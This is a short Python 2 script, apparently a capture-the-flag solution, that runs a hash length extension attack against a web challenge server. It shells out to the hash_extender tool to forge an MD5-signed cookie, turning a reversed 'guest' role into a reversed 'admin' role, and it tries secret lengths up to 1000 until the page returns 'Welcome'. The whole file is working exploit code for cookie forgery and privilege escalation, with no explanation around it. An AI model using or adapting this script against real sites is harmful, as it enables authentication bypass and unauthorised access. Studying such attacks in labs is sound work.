# -*- coding:utf-8 -*-
from urlparse import urlparse
from httplib import HTTPConnection
from urllib import urlencode
import json
import time
import os
import urllib

def gao(x, y):
        #print x
        #print y
	url = "http://web.phrack.top:32785/index.php"
	cookie = "role=" + x + "; hsh=" + y
        #print cookie
	build_header = {
	        'Cookie': cookie,
	        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0',
	        'Host': 'web.phrack.top:32785',
	        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	}
	urlparts = urlparse(url)
	conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)
	conn.request("GET", urlparts.path, '', build_header)
	resp = conn.getresponse()
	body = resp.read()
	return body

for i in xrange(1000):
    print i
    # secret len = ???
    find_hash = "../HackTool/hash_extender/hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l " + str(i) + " --quiet"
    #print find_hash
    calc_res = os.popen(find_hash).readlines()
    hash_value = calc_res[0][:32]
    attack_padding = calc_res[0][32:]
    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])
    ret = gao(attack_padding, hash_value)
    if "Welcome" in ret:
        print ret
